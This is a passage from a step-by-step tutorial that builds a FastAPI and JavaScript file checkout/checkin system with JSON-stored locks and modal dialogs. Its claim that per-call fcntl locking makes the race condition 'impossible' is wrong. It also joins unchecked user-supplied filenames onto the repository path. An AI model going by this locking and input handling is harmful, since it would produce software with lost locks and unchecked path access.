  console.log("DOM fully loaded");

  // Initial load
  loadFiles();

  // Add event listener to refresh button
  const refreshBtn = document.getElementById("refresh-btn");
  refreshBtn.addEventListener("click", function () {
    console.log("Refresh button clicked");
    loadFiles();
  });
});
```

### Understanding Event Listeners

```javascript
refreshBtn.addEventListener("click", function () {
  loadFiles();
});
```

**Breaking it down:**

- `refreshBtn` - The DOM element (the button)
- `.addEventListener()` - Register a listener
- `'click'` - The event type (also: `'mouseover'`, `'keydown'`, `'submit'`, etc.)
- `function() { ... }` - The callback function (runs when event fires)

**The Event Loop (How This Works):**

1. User clicks button
2. Browser creates a `click` event
3. Browser checks: "Does this element have click listeners?"
4. Finds your callback function
5. **Adds callback to the event queue**
6. Event loop picks it up and runs it
7. Your `loadFiles()` function executes

**This is asynchronous!** The click handler doesn't block anything.

### Test It

Refresh the page, click "Refresh" button.

**In the Console, you'll see:**

```
Refresh button clicked
Loading files from API...
Received data: {files: Array(3)}
Displayed 3 files
```

**In the Network tab:**

- Each click makes a new `/api/files` request

---

## 2.8: Form Input and POST Requests

Let's add a simple checkout form.

### Update HTML

Add this section to `index.html` (before the file list section):

```html
<section>
  <h2>Checkout File</h2>
  <form id="checkout-form">
    <div class="form-group">
      <label for="filename">Filename:</label>
      <input
        type="text"
        id="filename"
        name="filename"
        required
        placeholder="e.g., PN1001_OP1.mcam"
      />
    </div>

    <div class="form-group">
      <label for="user">Your Name:</label>
      <input
        type="text"
        id="user"
        name="user"
        required
        placeholder="e.g., John Doe"
      />
    </div>

    <div class="form-group">
      <label for="message">Message:</label>
      <input
        type="text"
        id="message"
        name="message"
        required
        placeholder="Why are you checking out this file?"
      />
    </div>

    <button type="submit" class="btn">Checkout</button>
  </form>
  <div id="checkout-result"></div>
</section>
```

### Update CSS

Add to `style.css`:

```css
/* ============================================
   FORMS
   ============================================ */

.form-group {
  margin-bottom: 1.5rem;
}

label {
  display: block;
  margin-bottom: 0.5rem;
  font-weight: 500;
  color: #333;
}

input[type="text"] {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
  transition: border-color 0.3s ease;
}

input[type="text"]:focus {
  outline: none;
  border-color: #667eea;
  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}

#checkout-result {
  margin-top: 1rem;
  padding: 1rem;
  border-radius: 4px;
  display: none;
}

#checkout-result.success {
  display: block;
  background: #d4edda;
  color: #155724;
  border: 1px solid #c3e6cb;
}

#checkout-result.error {
  display: block;
  background: #f8d7da;
  color: #721c24;
  border: 1px solid #f5c6cb;
}
```

### Update JavaScript

Add to `app.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded");
  loadFiles();

  // Refresh button
  const refreshBtn = document.getElementById("refresh-btn");
  refreshBtn.addEventListener("click", () => loadFiles());

  // Checkout form
  const checkoutForm = document.getElementById("checkout-form");
  checkoutForm.addEventListener("submit", handleCheckout);
});

// ============================================
// HANDLE CHECKOUT FORM SUBMISSION
// ============================================

async function handleCheckout(event) {
  // Prevent default form submission (which would reload the page)
  event.preventDefault();

  // Get form data
  const filename = document.getElementById("filename").value;
  const user = document.getElementById("user").value;
  const message = document.getElementById("message").value;

  console.log("Submitting checkout:", { filename, user, message });

  try {
    const response = await fetch("/api/checkout", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        filename: filename,
        user: user,
        message: message,
      }),
    });

    const data = await response.json();

    if (response.ok) {
      showResult(data.message, "success");
      // Clear form
      event.target.reset();
      // Reload file list
      loadFiles();
    } else {
      showResult("Error: " + (data.detail || "Unknown error"), "error");
    }
  } catch (error) {
    console.error("Checkout error:", error);
    showResult("Network error. Please try again.", "error");
  }
}

// ============================================
// SHOW RESULT MESSAGE
// ============================================

function showResult(message, type) {
  const resultDiv = document.getElementById("checkout-result");
  resultDiv.textContent = message;
  resultDiv.className = type;

  // Hide after 5 seconds
  setTimeout(() => {
    resultDiv.style.display = "none";
  }, 5000);
}
```

### Understanding Form Submission

**`event.preventDefault()`**

```javascript
async function handleCheckout(event) {
  event.preventDefault(); // ← CRITICAL
  // ...
}
```

**What happens WITHOUT this:**

1. User clicks "Submit"
2. Browser's default behavior: reload page with form data in URL
3. Your JavaScript never runs
4. Page reloads, losing all state

**With `preventDefault()`:**

1. User clicks "Submit"
2. Browser default is cancelled
3. Your JavaScript runs
4. You control what happens (make API call, show result)

### Making a POST Request

```javascript
const response = await fetch("/api/checkout", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    filename: filename,
    user: user,
    message: message,
  }),
});
```

**Breaking it down:**

- `method: 'POST'` - Use POST instead of GET
- `headers: { 'Content-Type': 'application/json' }` - Tell server we're sending JSON
- `body: JSON.stringify(...)` - Convert JavaScript object to JSON string

**Why `JSON.stringify()`?**

JavaScript object:

```javascript
{ filename: "test.mcam", user: "John" }
```

JSON string (what HTTP actually sends):

```json
"{\"filename\":\"test.mcam\",\"user\":\"John\"}"
```

The network can only send text. `JSON.stringify()` converts object → text.

### Test It

1. Fill out the form
2. Click "Checkout"
3. **Check the Network tab** - you'll see the POST request
4. **Check the Console** - you'll see the logs
5. Success message appears
6. Form clears

---

## 2.9: The Browser Rendering Pipeline

Understanding how the browser turns your code into pixels.

### The Steps

**1. HTML Parsing → DOM Tree**

```
HTML String → Parser → DOM Tree
```

**2. CSS Parsing → CSSOM Tree**

```
CSS String → Parser → CSSOM (CSS Object Model)
```

**3. Combine → Render Tree**

```
DOM + CSSOM → Render Tree (only visible elements)
```

**4. Layout (Reflow)**

- Calculate position and size of every element
- Box model calculations happen here

**5. Paint**

- Fill in pixels
- Text, colors, images, shadows

**6. Composite**

- Combine layers (elements with `position: fixed`, animations)
- Send to GPU

### Performance Implications

**Expensive Operations:**

- **Reflow** - Changing element size/position forces recalculation of entire layout
- **Repaint** - Changing colors/backgrounds repaints pixels

**Cheap Operations:**

- **Composite** - Only layer positioning (transform, opacity)

**Example:**

```javascript
// SLOW - Causes reflow
element.style.width = "200px";

// FAST - Only causes composite
element.style.transform = "translateX(200px)";
```

**This is why CSS transitions on `transform` are smooth.**

---

## Stage 2 Complete - You Built a Frontend!

### What You Built

You now have:

- A complete HTML/CSS/JavaScript frontend
- Static file serving from FastAPI
- API requests (GET and POST) from JavaScript
- User interaction with event listeners
- Form handling
- Dynamic DOM manipulation
- Async/await in JavaScript

### Your File Structure

```
backend/
├── main.py            # FastAPI backend with API endpoints
├── static/
│   ├── index.html     # HTML structure
│   ├── css/
│   │   └── style.css  # Styling
│   └── js/
│       └── app.js     # JavaScript behavior
└── test_main.py       # Tests
```

### Verification Checklist

- [ ] Can see styled page at `http://127.0.0.1:8000`
- [ ] Files load from API automatically
- [ ] Refresh button works
- [ ] Can submit checkout form
- [ ] Form shows success message
- [ ] Understand HTML/CSS/JS relationship
- [ ] Understand DOM manipulation
- [ ] Understand async/await in JavaScript
- [ ] Can use browser dev tools

### What's Next?

In **Stage 3**, we'll make this app actually DO something by:

- Reading files from the filesystem
- Implementing real checkout logic
- Adding file locking
- Storing data in JSON files
- Learning file I/O in Python

The foundation is complete. Now we build the real application.

---

# Stage 3: App Core Features - Real File Operations & Locking

## Introduction: The Goal of This Stage

So far, your app uses hardcoded data. In this stage, you'll make it REAL by:

- Reading actual files from the filesystem
- Implementing file locking (the core PDM feature)
- Persisting data in JSON files
- Handling concurrent operations safely
- Understanding file I/O deeply
- Learning about race conditions and how to prevent them

By the end of this stage, you will:

- Read files from a `repo/` directory
- Store lock information in `locks.json`
- Prevent two users from editing the same file simultaneously
- Understand Python's file I/O operations
- Handle errors gracefully
- Update your frontend to checkout/checkin files

**Time Investment:** 5-7 hours

---

## 3.1: Understanding the Filesystem

### What is a Filesystem?

The **filesystem** is how your operating system organizes files on disk. Think of it like a filing cabinet:

- **Directories (folders)** = Drawers and folders
- **Files** = Individual documents
- **Paths** = The address to find a document

### Absolute vs Relative Paths

**Absolute Path** - Full address from root:

```
Windows:   C:\Users\YourName\pdm-tutorial\backend\repo\file.mcam
macOS:     /Users/YourName/pdm-tutorial/backend/repo/file.mcam
Linux:     /home/yourname/pdm-tutorial/backend/repo/file.mcam
```

**Relative Path** - Address from current directory:

```
./repo/file.mcam           # Current dir → repo → file.mcam
../backend/repo/file.mcam  # Up one level → backend → repo
repo/file.mcam             # Shorthand (same as ./)
```

### The Current Working Directory

Every running program has a **current working directory** (cwd).

**Find it in Python:**

```python
import os
print(os.getcwd())
# Output: /Users/yourname/pdm-tutorial/backend
```

**Why this matters:**

- Relative paths are relative TO the cwd
- If you run `python main.py` from different locations, relative paths break
- We'll use absolute paths for reliability

---

## 3.2: Creating the Repository Structure

### Create the Repo Directory

```bash
# In backend/ directory
mkdir -p repo
```

### Add Sample Files

Create some dummy `.mcam` files:

```bash
# In backend/ directory
cd repo

# Create sample files (these are just text files for testing)
echo "G0 X0 Y0" > PN1001_OP1.mcam
echo "G0 X10 Y10" > PN1002_OP1.mcam
echo "G0 X20 Y20" > PN1003_OP1.mcam
echo "G0 X30 Y30" > PN1234567-A.mcam

cd ..
```

**Your structure:**

```
backend/
├── main.py
├── repo/
│   ├── PN1001_OP1.mcam
│   ├── PN1002_OP1.mcam
│   ├── PN1003_OP1.mcam
│   └── PN1234567-A.mcam
└── static/
    └── ...
```

---

## 3.3: Reading Files in Python - Deep Dive

### The `os` Module

Python's `os` module provides operating system functionality.

**Common operations:**

```python
import os

# Current directory
cwd = os.getcwd()

# List files in a directory
files = os.listdir('repo')
# Returns: ['PN1001_OP1.mcam', 'PN1002_OP1.mcam', ...]

# Check if path exists
exists = os.path.exists('repo/PN1001_OP1.mcam')  # True

# Check if it's a file (not directory)
is_file = os.path.isfile('repo/PN1001_OP1.mcam')  # True

# Check if it's a directory
is_dir = os.path.isdir('repo')  # True

# Get file size (in bytes)
size = os.path.getsize('repo/PN1001_OP1.mcam')

# Join paths (handles OS differences)
path = os.path.join('repo', 'PN1001_OP1.mcam')
# Returns: 'repo/PN1001_OP1.mcam'
```

### Path Operations with `os.path`

```python
import os

path = '/home/user/pdm-tutorial/backend/repo/PN1001_OP1.mcam'

# Get just the directory
dirname = os.path.dirname(path)
# Returns: '/home/user/pdm-tutorial/backend/repo'

# Get just the filename
basename = os.path.basename(path)
# Returns: 'PN1001_OP1.mcam'

# Split into directory and filename
dir_part, file_part = os.path.split(path)

# Split filename and extension
name, ext = os.path.splitext('PN1001_OP1.mcam')
# name: 'PN1001_OP1', ext: '.mcam'

# Get absolute path
abs_path = os.path.abspath('repo/file.mcam')
# Converts relative → absolute based on cwd
```

### Creating Absolute Paths

**The Problem with Relative Paths:**

```python
# If you're in /backend
os.listdir('repo')  # Works

# If you're in /
os.listdir('repo')  # Error: repo doesn't exist here!
```

**The Solution:**

```python
import os

# Get the directory where THIS Python file lives
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# __file__ is a special variable = path to current .py file
# os.path.abspath(__file__) makes it absolute
# os.path.dirname(...) gets just the directory part

# Now build absolute path to repo
REPO_PATH = os.path.join(BASE_DIR, 'repo')

# This ALWAYS works, regardless of where you run the script
files = os.listdir(REPO_PATH)
```

**Add this to `main.py`:**

```python
import os
from pathlib import Path

# Get absolute path to the directory containing this file
BASE_DIR = Path(__file__).resolve().parent

# Path to repository folder
REPO_PATH = BASE_DIR / 'repo'

# Path to locks file (we'll create this soon)
LOCKS_FILE = BASE_DIR / 'locks.json'
```

**Note:** We're using `pathlib.Path` (modern) instead of `os.path` (old style). Both work; `Path` is cleaner.

---

## 3.4: Reading the File List

### Update the API Endpoint

Replace your hardcoded `get_files()` in `main.py`:

```python
from pathlib import Path
from typing import List
import os

# At the top, after imports
BASE_DIR = Path(__file__).resolve().parent
REPO_PATH = BASE_DIR / 'repo'

@app.get("/api/files")
def get_files():
    """
    Returns a list of all .mcam files in the repository.
    """
    logger.info(f"Scanning repository: {REPO_PATH}")

    # Check if repo directory exists
    if not REPO_PATH.exists():
        logger.error(f"Repository path does not exist: {REPO_PATH}")
        raise HTTPException(
            status_code=500,
            detail="Repository directory not found"
        )

    # Get all files in repo directory
    all_items = os.listdir(REPO_PATH)
    logger.info(f"Found {len(all_items)} items in repo")

    # Filter to only .mcam files
    files = []
    for filename in all_items:
        # Build full path
        full_path = REPO_PATH / filename

        # Check if it's a file (not directory) and has .mcam extension
        if full_path.is_file() and filename.endswith('.mcam'):
            files.append({
                "name": filename,
                "status": "available",  # For now, all are available
                "size": full_path.stat().st_size  # Size in bytes
            })

    logger.info(f"Returning {len(files)} .mcam files")

    return {"files": files}
```

### Understanding the Code

**`REPO_PATH.exists()`**

- Checks if path exists on filesystem
- Returns `True` or `False`
- Good practice: always check before accessing

**`os.listdir(REPO_PATH)`**

- Returns list of filenames (strings)
- Does NOT include subdirectories' contents
- Order is arbitrary (not sorted)

**`full_path.is_file()`**

- `Path` object method
- Checks if it's a file (vs. directory)
- Returns `False` for directories

**`filename.endswith('.mcam')`**

- String method
- Case-sensitive! `.MCAM` won't match
- Better: `filename.lower().endswith('.mcam')`

**`full_path.stat().st_size`**

- `.stat()` returns file metadata
- `.st_size` is size in bytes
- Other attributes: `.st_mtime` (modified time), `.st_ctime` (created time)

### Test It

**Restart your server:**

```bash
uvicorn main:app --reload
```

**Visit:** `http://127.0.0.1:8000`

**You should see:**

- PN1001_OP1.mcam
- PN1002_OP1.mcam
- PN1003_OP1.mcam
- PN1234567-A.mcam

**All real files from your `repo/` directory!**

---

## 3.5: Working with JSON Files

### What is JSON?

**JSON (JavaScript Object Notation)** is a text format for storing data.

**Why JSON?**

- Human-readable
- Easy to parse in any language
- Standard for web APIs
- Built into Python (`json` module)

**Example:**

```json
{
  "name": "John Doe",
  "age": 30,
  "active": true,
  "skills": ["Python", "JavaScript"],
  "address": {
    "city": "Boston",
    "state": "MA"
  }
}
```

### Python ↔ JSON Mapping

| Python         | JSON     |
| -------------- | -------- |
| `dict`         | `object` |
| `list`         | `array`  |
| `str`          | `string` |
| `int`, `float` | `number` |
| `True`         | `true`   |
| `False`        | `false`  |
| `None`         | `null`   |

### Reading JSON

```python
import json

# Read from file
with open('data.json', 'r') as f:
    data = json.load(f)  # Returns Python dict/list

# Parse from string
json_string = '{"name": "John", "age": 30}'
data = json.loads(json_string)  # Note the 's' in loads
```

### Writing JSON

```python
import json

data = {
    "name": "John",
    "age": 30,
    "skills": ["Python", "JavaScript"]
}

# Write to file
with open('data.json', 'w') as f:
    json.dump(data, f, indent=4)
    # indent=4 makes it pretty-printed (readable)

# Convert to string
json_string = json.dumps(data, indent=4)
```

### The `with` Statement - Context Managers

**What is `with`?**

```python
# Without 'with' - Manual cleanup
f = open('file.txt', 'r')
content = f.read()
f.close()  # You MUST remember to close!
```

**Problems:**

- Easy to forget `close()`
- If error occurs, file might stay open
- Open files consume system resources

**With `with` - Automatic cleanup:**

```python
with open('file.txt', 'r') as f:
    content = f.read()
# File is AUTOMATICALLY closed here, even if error occurred
```

**How it works:**

1. `open()` returns a file object
2. `with` statement calls `f.__enter__()`
3. Your code runs
4. When block exits (success OR error), `with` calls `f.__exit__()`
5. `__exit__()` closes the file

**This is the Python Context Manager protocol.** Always use `with` for file operations.

---

## 3.6: Implementing File Locking

### The Lock Data Structure

Create `backend/locks.json`:

```json
{
  "PN1001_OP1.mcam": {
    "user": "john_doe",
    "timestamp": "2025-10-03T20:30:00Z",
    "message": "Editing fixture offsets"
  }
}
```

**Structure:**

- Key: filename
- Value: object with lock details

### Helper Functions

Add to `main.py`:

```python
import json
from datetime import datetime, timezone

# Path to locks file
LOCKS_FILE = BASE_DIR / 'locks.json'

# ============================================
# LOCK MANAGEMENT FUNCTIONS
# ============================================

def load_locks() -> dict:
    """
    Load lock data from locks.json.
    Returns empty dict if file doesn't exist.
    """
    if not LOCKS_FILE.exists():
        logger.info("Locks file doesn't exist, returning empty dict")
        return {}

    try:
        with open(LOCKS_FILE, 'r') as f:
            locks = json.load(f)
        logger.info(f"Loaded {len(locks)} locks from file")
        return locks
    except json.JSONDecodeError as e:
        logger.error(f"Error parsing locks.json: {e}")
        return {}

def save_locks(locks: dict):
    """
    Save lock data to locks.json.
    """
    try:
        with open(LOCKS_FILE, 'w') as f:
            json.dump(locks, f, indent=4)
        logger.info(f"Saved {len(locks)} locks to file")
    except Exception as e:
        logger.error(f"Error saving locks: {e}")
        raise HTTPException(
            status_code=500,
            detail="Failed to save lock data"
        )

def is_locked(filename: str) -> bool:
    """
    Check if a file is currently locked.
    """
    locks = load_locks()
    return filename in locks

def get_lock_info(filename: str) -> dict:
    """
    Get lock information for a specific file.
    Returns None if not locked.
    """
    locks = load_locks()
    return locks.get(filename)
```

### Understanding the Code

**Type hints: `-> dict`**

```python
def load_locks() -> dict:
```

The `-> dict` tells Python (and developers) what the function returns. This enables:

- IDE autocomplete
- Type checking tools (mypy)
- Better documentation

**`locks.get(filename)`**

```python
# With .get()
value = locks.get('PN1001_OP1.mcam')
# Returns None if key doesn't exist

# With [] brackets
value = locks['PN1001_OP1.mcam']
# Raises KeyError if key doesn't exist
```

`.get()` is safer for optional values.

---

## 3.7: Checkout and Checkin Endpoints

### Update the Data Models

```python
from pydantic import BaseModel, Field

class CheckoutRequest(BaseModel):
    filename: str
    user: str
    message: str = Field(..., min_length=1, max_length=500)

class CheckinRequest(BaseModel):
    filename: str
    user: str
```

### Implement Checkout

```python
@app.post("/api/files/checkout")
def checkout_file(request: CheckoutRequest):
    """
    Checkout a file (acquire lock).
    """
    logger.info(f"Checkout request: {request.user} -> {request.filename}")

    # Check if file exists
    file_path = REPO_PATH / request.filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    # Load current locks
    locks = load_locks()

    # Check if already locked
    if request.filename in locks:
        existing_lock = locks[request.filename]
        raise HTTPException(
            status_code=409,  # 409 Conflict
            detail={
                "error": "File is already checked out",
                "locked_by": existing_lock["user"],
                "locked_at": existing_lock["timestamp"]
            }
        )

    # Create lock
    locks[request.filename] = {
        "user": request.user,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "message": request.message
    }

    # Save locks
    save_locks(locks)

    logger.info(f"File checked out successfully: {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked out by {request.user}"
    }
```

### Implement Checkin

```python
@app.post("/api/files/checkin")
def checkin_file(request: CheckinRequest):
    """
    Checkin a file (release lock).
    """
    logger.info(f"Checkin request: {request.user} -> {request.filename}")

    # Load current locks
    locks = load_locks()

    # Check if file is locked
    if request.filename not in locks:
        raise HTTPException(
            status_code=400,
            detail="File is not checked out"
        )

    # Verify user owns the lock
    lock_info = locks[request.filename]
    if lock_info["user"] != request.user:
        raise HTTPException(
            status_code=403,
            detail=f"File is locked by {lock_info['user']}, not {request.user}"
        )

    # Remove lock
    del locks[request.filename]

    # Save locks
    save_locks(locks)

    logger.info(f"File checked in successfully: {request.filename}")

    return {
        "success": True,
        "message": f"File '{request.filename}' checked in by {request.user}"
    }
```

### Update Get Files to Show Lock Status

```python
@app.get("/api/files")
def get_files():
    """
    Returns a list of all .mcam files with lock status.
    """
    logger.info(f"Scanning repository: {REPO_PATH}")

    if not REPO_PATH.exists():
        raise HTTPException(status_code=500, detail="Repository not found")

    # Load lock information
    locks = load_locks()

    all_items = os.listdir(REPO_PATH)
    files = []

    for filename in all_items:
        full_path = REPO_PATH / filename

        if full_path.is_file() and filename.endswith('.mcam'):
            # Check if file is locked
            if filename in locks:
                lock_info = locks[filename]
                status = "checked_out"
                locked_by = lock_info["user"]
            else:
                status = "available"
                locked_by = None

            files.append({
                "name": filename,
                "status": status,
                "size": full_path.stat().st_size,
                "locked_by": locked_by
            })

    logger.info(f"Returning {len(files)} files")
    return {"files": files}
```

---

## 3.8: Race Conditions - The Biggest Hidden Danger

### What is a Race Condition?

A **race condition** occurs when two operations happen at the "same time" and interfere with each other.

**The Scenario:**

```
10:00:00.000 - User A requests checkout of file.mcam
10:00:00.001 - User B requests checkout of file.mcam

Both requests:
1. load_locks() - both see file is NOT locked
2. Both add their lock to the dict
3. Both save_locks()

Result: Last save wins. One user's lock is silently overwritten.
```

### Visualizing the Race

```python
# User A's request thread
locks = load_locks()          # locks = {}
locks['file.mcam'] = {        # locks = {'file.mcam': {user: 'A'}}
    'user': 'A'
}
# ← Context switch happens here!
save_locks(locks)             # Writes: {'file.mcam': {user: 'A'}}

# User B's request thread
locks = load_locks()          # locks = {} (before A saved!)
locks['file.mcam'] = {        # locks = {'file.mcam': {user: 'B'}}
    'user': 'B'
}
save_locks(locks)             # Writes: {'file.mcam': {user: 'B'}}
                              # User A's lock is GONE
```

### The Solution: File Locking

Python's `fcntl` module (Unix) or `msvcrt` (Windows) provides OS-level file locking.

**Create a helper class:**

```python
import fcntl  # Unix/Linux/Mac
# For Windows, you'd use: import msvcrt

class LockedFile:
    """
    Context manager for file locking.
    Ensures only one process can access the file at a time.
    """
    def __init__(self, filepath, mode='r'):
        self.filepath = filepath
        self.mode = mode
        self.file = None

    def __enter__(self):
        self.file = open(self.filepath, self.mode)
        # Acquire exclusive lock (blocks until available)
        fcntl.flock(self.file, fcntl.LOCK_EX)
        logger.debug(f"Acquired lock on {self.filepath}")
        return self.file

    def __exit__(self, exc_type, exc_val, exc_tb):
        # Release lock
        fcntl.flock(self.file, fcntl.LOCK_UN)
        self.file.close()
        logger.debug(f"Released lock on {self.filepath}")
        return False
```

### Update Lock Functions

```python
def load_locks() -> dict:
    """Load locks with file locking."""
    if not LOCKS_FILE.exists():
        return {}

    try:
        with LockedFile(LOCKS_FILE, 'r') as f:
            locks = json.load(f)
        return locks
    except json.JSONDecodeError:
        return {}

def save_locks(locks: dict):
    """Save locks with file locking."""
    with LockedFile(LOCKS_FILE, 'w') as f:
        json.dump(locks, f, indent=4)
```

**Now the race condition is impossible:**

1. User A's request acquires file lock
2. User B's request tries to acquire lock
3. User B's request **waits** (blocks)
4. User A finishes, releases lock
5. User B acquires lock and proceeds

### Testing the Fix

This is hard to test manually (race conditions are by nature rare). We'll write a proper test in Stage 31.

---

## 3.9: Update Frontend for Checkout/Checkin

### Update HTML

Replace the checkout form section in `index.html`:

```html
<section>
  <h2>File Actions</h2>
  <div id="file-actions">
    <p>Select a file from the list below to checkout or checkin.</p>
  </div>
</section>
```

### Update CSS

Add to `style.css`:

```css
/* ============================================
   FILE ACTIONS
   ============================================ */

.file-actions {
  display: flex;
  gap: 0.5rem;
  align-items: center;
}

.btn-checkout {
  background: #28a745;
}

.btn-checkout:hover {
  background: #218838;
}

.btn-checkin {
  background: #ffc107;
  color: #333;
}

.btn-checkin:hover {
  background: #e0a800;
}

.locked-indicator {
  font-size: 0.85rem;
  color: #856404;
  font-style: italic;
}
```

### Update JavaScript

Replace the file display logic in `app.js`:

```javascript
function createFileElement(file) {
  const div = document.createElement("div");
  div.className = "file-item";

  // File info section
  const infoDiv = document.createElement("div");

  const nameSpan = document.createElement("span");
  nameSpan.className = "file-name";
  nameSpan.textContent = file.name;

  const statusSpan = document.createElement("span");
  statusSpan.className = `file-status status-${file.status}`;
  statusSpan.textContent = file.status.replace("_", " ");

  infoDiv.appendChild(nameSpan);
  infoDiv.appendChild(statusSpan);

  // Locked by info
  if (file.locked_by) {
    const lockedSpan = document.createElement("span");
    lockedSpan.className = "locked-indicator";
    lockedSpan.textContent = ` (locked by ${file.locked_by})`;
    infoDiv.appendChild(lockedSpan);
  }

  // Actions section
  const actionsDiv = document.createElement("div");
  actionsDiv.className = "file-actions";

  if (file.status === "available") {
    const checkoutBtn = document.createElement("button");
    checkoutBtn.className = "btn btn-checkout";
    checkoutBtn.textContent = "Checkout";
    checkoutBtn.onclick = () => handleCheckout(file.name);
    actionsDiv.appendChild(checkoutBtn);
  } else {
    const checkinBtn = document.createElement("button");
    checkinBtn.className = "btn btn-checkin";
    checkinBtn.textContent = "Checkin";
    checkinBtn.onclick = () => handleCheckin(file.name);
    actionsDiv.appendChild(checkinBtn);
  }

  div.appendChild(infoDiv);
  div.appendChild(actionsDiv);

  return div;
}

// ============================================
// CHECKOUT HANDLER
// ============================================

async function handleCheckout(filename) {
  const user = prompt("Enter your name:");
  if (!user) return;

  const message = prompt("Why are you checking out this file?");
  if (!message) return;

  try {
    const response = await fetch("/api/files/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename, user, message }),
    });

    if (response.ok) {
      alert(`Successfully checked out ${filename}`);
      loadFiles(); // Reload to show new status
    } else {
      const error = await response.json();
      alert(`Error: ${error.detail.error || error.detail}`);
    }
  } catch (error) {
    console.error("Checkout error:", error);
    alert("Network error. Please try again.");
  }
}

// ============================================
// CHECKIN HANDLER
// ============================================

async function handleCheckin(filename) {
  const user = prompt("Enter your name (must match checkout user):");
  if (!user) return;

  try {
    const response = await fetch("/api/files/checkin", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename, user }),
    });

    if (response.ok) {
      alert(`Successfully checked in ${filename}`);
      loadFiles();
    } else {
      const error = await response.json();
      alert(`Error: ${error.detail}`);
    }
  } catch (error) {
    console.error("Checkin error:", error);
    alert("Network error. Please try again.");
  }
}
```

---

## 3.10: Testing the Complete System

### Test Scenario 1: Normal Checkout/Checkin

1. Visit `http://127.0.0.1:8000`
2. Click "Checkout" on any file
3. Enter your name: "John"
4. Enter message: "Testing the lock system"
5. File status changes to "checked_out"
6. Click "Checkin"
7. Enter name: "John" (same user)
8. File status changes to "available"

### Test Scenario 2: Preventing Double Checkout

1. Checkout a file as "John"
2. Try to checkout the same file as "Jane"
3. Should see error: "File is already checked out"

### Test Scenario 3: Wrong User Checkin

1. Checkout file as "John"
2. Try to checkin as "Jane"
3. Should see error: "File is locked by John, not Jane"

### Check the locks.json File

After checking out a file:

```bash
cat backend/locks.json
```

You should see:

```json
{
  "PN1001_OP1.mcam": {
    "user": "John",
    "timestamp": "2025-10-03T20:45:30.123456Z",
    "message": "Testing the lock system"
  }
}
```

---

## Stage 3 Complete - Real File Operations!

### What You Built

You now have:

- Real file reading from the filesystem
- File locking system (prevents concurrent edits)
- JSON-based data persistence
- Protected against race conditions
- Complete checkout/checkin workflow
- Error handling for all edge cases

### Key Concepts Mastered

**File I/O:**

- `os` module operations
- `pathlib.Path` for modern path handling
- Absolute vs relative paths
- Context managers (`with` statement)

**JSON:**

- Reading/writing JSON files
- Python ↔ JSON type mapping
- Structured data storage

**Concurrency:**

- Race conditions and how they happen
- File locking with `fcntl`
- Atomic operations

**Application Logic:**

- State management (locked vs available)
- User authorization (only lock owner can checkin)
- Data validation with Pydantic

### Verification Checklist

- [ ] Can see real files from `repo/` directory
- [ ] Can checkout a file
- [ ] Can checkin a file
- [ ] Cannot checkout already-locked file
- [ ] Cannot checkin file locked by someone else
- [ ] `locks.json` updates correctly
- [ ] Understand file I/O operations
- [ ] Understand race conditions
- [ ] Understand JSON serialization

### What's Next?

In **Stage 4**, we'll modernize the frontend by introducing a **React component** (optional pivot) or enhancing our vanilla JS with better state management, and we'll add features like:

- File filtering and search
- Sorting
- Better UI for checkout/checkin (modal dialogs)
- Real-time updates without page refresh

But first, we have a solid foundation: a working PDM system that prevents file conflicts!

---

# Stage 4: Frontend Enhancements - Interactive UI Patterns

## Introduction: The Goal of This Stage

Your app works, but the UX needs polish. Using `prompt()` dialogs is clunky. Users can't search or filter files. There's no visual feedback during operations.

In this stage, you'll learn professional frontend patterns:

- Custom modal dialogs (replacing browser prompts)
- Search and filter functionality
- Sorting with multiple criteria
- Loading states and user feedback
- Event delegation for better performance
- State management patterns in vanilla JavaScript

By the end of this stage, you will:

- Build reusable modal components
- Implement client-side search/filter
- Add multi-column sorting
- Show loading spinners during API calls
- Understand event bubbling and delegation
- Learn when vanilla JS is enough (and when frameworks help)

**Time Investment:** 4-6 hours

---

## 4.1: The Problem with `prompt()` and `alert()`

### Why Browser Dialogs Are Bad UX

**Current code:**

```javascript
const user = prompt("Enter your name:");
const message = prompt("Why are you checking out this file?");
```

**Problems:**

1. **Ugly** - Can't style them, look different on every browser
2. **Blocking** - Entire page freezes
3. **Limited** - Only plain text, no validation
4. **Inaccessible** - Screen readers struggle
5. **Non-standard** - Some browsers suppress them

**Professional Solution:** Custom modal dialogs.

---

## 4.2: Building a Modal Component

### Understanding Modal Architecture

A modal is composed of:

1. **Overlay (backdrop)** - Darkens background, blocks clicks
2. **Modal container** - The actual dialog box
3. **Content** - Form, text, buttons
4. **Close mechanism** - X button, Cancel, click outside, ESC key

### HTML Structure

Add to `index.html` (before closing `</body>`):

```html
<!-- Checkout Modal -->
<div id="checkout-modal" class="modal-overlay hidden">
  <div class="modal-content">
    <div class="modal-header">
      <h3>Checkout File</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <p>File: <strong id="checkout-filename"></strong></p>

      <form id="checkout-form">
        <div class="form-group">
          <label for="checkout-user">Your Name:</label>
          <input
            type="text"
            id="checkout-user"
            required
            placeholder="Enter your name"
            autocomplete="name"
          />
        </div>

        <div class="form-group">
          <label for="checkout-message">Reason:</label>
          <textarea
            id="checkout-message"
            rows="3"
            required
            placeholder="Why are you checking out this file?"
          ></textarea>
        </div>

        <div class="modal-actions">
          <button type="button" class="btn btn-secondary" id="checkout-cancel">
            Cancel
          </button>
          <button type="submit" class="btn btn-checkout">Checkout</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- Checkin Modal -->
<div id="checkin-modal" class="modal-overlay hidden">
  <div class="modal-content">
    <div class="modal-header">
      <h3>Checkin File</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <p>File: <strong id="checkin-filename"></strong></p>
      <p class="info-text">
        Checking in will release the lock and allow others to edit this file.
      </p>

